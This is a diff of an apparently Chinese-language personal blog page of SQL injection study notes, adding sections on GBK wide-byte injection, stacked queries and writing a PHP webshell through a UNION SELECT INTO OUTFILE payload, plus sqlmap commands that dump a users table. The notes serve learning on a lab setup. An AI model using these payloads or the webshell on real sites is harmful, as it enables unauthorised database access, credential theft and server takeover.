@@ -314,7 +314,7 @@
 <p><code>select ascii(substr((select database()),1,1));</code></p>
 </li>
 <li><p>将<code>select database()</code>替换为想要查询的语句即可</p>
-<p><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_name=database() limit 0,1)1,1))&gt;100 --+ #查询表名 </code></p>
+<p><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+ #查询表名 </code></p>
 <p>此处没有必要使用<code>group_concat()</code>函数，而是使用<code>limit 0,1</code>，从第0行开始显示1行，从结果的第一行数据依次查询。</p>
 </li>
 <li><p>布尔盲注闭合符的判断</p>
@@ -345,12 +345,41 @@
 <h1 id="七、sqlmap"><a href="#七、sqlmap" class="headerlink" title="七、sqlmap"></a>七、sqlmap</h1><p>打开虚拟机kali,进入命令行模式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. sqlmap --version 查看版本</span><br><span class="line">2. sqlmap -h  查看帮助</span><br><span class="line">3. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; 查询是否存在注入点</span><br><span class="line">4. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --dbs 查看数据库</span><br><span class="line">5. --batch 默认选择</span><br><span class="line">6. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --current-db 查看web当前使用的数据库</span><br><span class="line">6. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --tables -D &quot;security(指定数据库名)&quot; 查看指定数据库中的表名</span><br><span class="line">7. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --columns -T &quot;users(指定表名)&quot; -D &quot;security&quot; 查看数据库中的字段</span><br><span class="line">8. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --dump -C &quot;id,username,password&quot; -T &quot;users&quot; -D &quot;security&quot; 查看指定的字段数据内容</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
+<h1 id="八、宽字节注入"><a href="#八、宽字节注入" class="headerlink" title="八、宽字节注入"></a>八、宽字节注入</h1><ul>
+<li><p>函数<code>addslashes()</code></p>
+<p>在指定的预定字符前添加反斜杠。这些字符是单引号，双引号，反斜线和NULL字符。</p>
+</li>
+<li><p>GBK编码</p>
+<ul>
+<li><p>Mysql在使用GBK编码的时候，会认为两个字符为一个汉字，所以可以使用一些字符，和经过转义过后多出来的<code>\</code>组合成两个字符，变成Mysql数据库不识别的汉字字符，导致对单引号、双引号的转义失败，使其闭合。</p>
+</li>
+<li><p>字符<code>\</code>的ASCII码为92(URL编码:<code>%5c</code>)，在其前面输入<code>%df&#39;</code>(编码位为223),这样<code>%df%5c</code>符合GBK的取值范围(第一个字节为129-254，第二个字节64-254)，会解析为一个汉字，使得<code>\</code>失去作用。</p>
+<p><img src="/SQL_ZhuRu.assets/image-20231226192600754.png" alt="image-20231226192600754"></p>
+</li>
+</ul>
+</li>
+<li><p>前提：要求对方Mysql数据库的编码方式是GBK编码，并且发请求时声明客户端用的也是GBK编码。</p>
+<p><code>mysqli_query($con,&quot;SET NAMES gbk&quot;)&#39;</code></p>
+</li>
+<li><p>对于post方式传参，需要提前将<code>%df</code>进行解码再输入，因为会将<code>%</code>编码为<code>%25</code>。</p>
+</li>
+</ul>
+<h1 id="九、堆叠注入"><a href="#九、堆叠注入" class="headerlink" title="九、堆叠注入"></a>九、堆叠注入</h1><ul>
+<li>堆叠注入。<code> mysqli_multi_query($con1, $sql) //支持多条sql语句同时执行，由；分隔，成堆的执行sql语句</code>。</li>
+<li>在<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code>闭合处进行对数据库的增删改查操作。(前提是有权限)</li>
+</ul>
+<h1 id="十、文件上传指令"><a href="#十、文件上传指令" class="headerlink" title="十、文件上传指令"></a>十、文件上传指令</h1><ul>
+<li><p><code>&lt;?php @eva($_post[&#39;password&#39;]);?&gt;</code>为一句话木马</p>
+</li>
+<li><pre><code>?id=-1&#39;)) union select 1,&quot;&lt;?php @eva($_post[&#39;password&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\123.php&quot; -- -
+</code></pre>
+</li>
+<li><p>其中</p>
+<p><code>password</code>为预留密码</p>
+<p><code>D:\\phpstudy_pro\\WWW\\123.php</code>为文件路径</p>
+<p><code>123.php</code>为新插入的文件名</p>
+</li>
+</ul>
 
     </div>
 </article>
@@ -412,6 +441,18 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2024/01/02/web_sentou/">web渗透</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
                 </span>
             </li>
@@ -458,18 +499,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/04/WangLuoAnQuanJiChu/">网络安全知识基础和Proxifier的使用</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/04/AhMyth_use/">Ahmyth的使用</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -488,13 +517,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/03/daboke/">利用github搭博客</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/03/python/">python安装</a>
+                    <a href="/2023/12/03/diaoyuyemianyouhua/">钓鱼页面优化</a>
                 </span>
             </li>
             
@@ -518,6 +541,12 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2023/12/10/HTML5/">HTML5的基本知识</a>
                 </span>
             </li>
@@ -530,19 +559,19 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/17/php_study/">php的一些基础知识</a>
+                    <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/17/phpstudy_mysql/">phpstudy的mysql服务开启</a>
+                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/17/vue/">vue导入</a>
+                    <a href="/2024/01/02/web_sentou/">web渗透</a>
                 </span>
             </li>
             
